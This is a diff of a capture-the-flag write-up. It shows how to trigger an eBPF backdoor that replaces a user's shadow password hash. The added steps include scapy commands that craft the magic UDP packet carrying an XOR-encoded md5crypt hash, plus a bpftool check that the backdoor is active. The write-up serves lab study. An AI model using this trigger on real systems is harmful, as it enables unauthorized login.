@@ -459,40 +459,26 @@ int getspnam_r_exit(long long unsigned int * ctx):
 Not much code to stare at here, either. But this eBPF code likely overwrites the shadow password hash, that the target process acquired for a user (like sshd, for login purposes), with the hash value that was transferred via the magic packet.
 
 ## Crafting the Magic Packet
-```
-sudo scapy
->>> p = IP(dst="127.0.0.1")/UDP(dport=1337, len=42)/Raw("fsf"+31*"b")
->>> send(p)
-.
-Sent 1 packets.
-```
-
--> should do something, but doesnt look like?
--> somehow the scapy crafted udp packet is not relayed through qemu port forward
--> installing scapy inside qemu image
-
+Now that the *magic* has been identified, it's time to craft a packet that will trigger the eBPF code. In the first tests, I was sending the crafted packet from host to qemu guest system, expecting the forward rule for udp dst port 1337 to work. For some reason, it didn't.
+For local testing purposes, scapy may as well be installed to the guest system via:
 ```
 apt install python3-scapy
 ```
 
-
-approach:
-I think that you can provide it with a hash
-
-
+Generate an md5crypt hash for the password 'pass':
 ```
 mkpasswd -m md5crypt
 Password: pass
 $1$wtuNYIeB$Bo28F812s3/AhXWZWIcso.
 ```
 
-xor with 66
+XOR the hash value (without $1$ prefix!) with 66 ('B') yields:
 ```
--> 35 36 37 0c 1b 0b 27 00 66 00 2d 70 7a 04 7a 73 70 31 71 6d 03 2a 1a 15 18 15 0b 21 31 2d 6c
-https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Decimal','string':'66'%7D,'Standard',false)To_Hex('Space',0)&input=d3R1TllJZUIkQm8yOEY4MTJzMy9BaFhXWldJY3NvLg
+35 36 37 0c 1b 0b 27 00 66 00 2d 70 7a 04 7a 73 70 31 71 6d 03 2a 1a 15 18 15 0b 21 31 2d 6c
 ```
-31 bytes to add after fsf in udp data
+See [CyberChef](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Decimal','string':'66'%7D,'Standard',false)To_Hex('Space',0)&input=d3R1TllJZUIkQm8yOEY4MTJzMy9BaFhXWldJY3NvLg)
 
+Craft and send the full packet (udp dst port 1337, udp len 42, udp payload begins with 'fsf' followed by XOR'd hash value
 ```
 p = IP(dst="127.0.0.1")/UDP(dport=1337, len=0x2a)/Raw("fsf"+"\x35\x36\x37\x0c\x1b\x0b\x27\x00\x66\x00\x2d\x70\x7a\x04\x7a\x73\x70\x31\x71\x6d\x03\x2a\x1a\x15\x18\x15\x0b\x21\x31\x2d\x6c")
 
@@ -504,6 +490,7 @@ p = IP(dst="127.0.0.1")/UDP(dport=1337, len=0x2a)/Raw("fsf"+"\x35\x36\x37\x0c\x1
 Sent 1 packets.
 ```
 
+Verify that the backdoor is enabled and the hash hash value has been set:
 ```
 root@egghunt:/proc/974/fd# bpftool -p map dump id 4
 [{
@@ -525,6 +512,7 @@ root@egghunt:/proc/974/fd# bpftool -p map dump id 4
     }
 ]
 ```
+W00t!
 
 ## Now it's Flag Time!
 Send the magic packet to put hash for md5crypt password of **pass** into bpf backdoor.
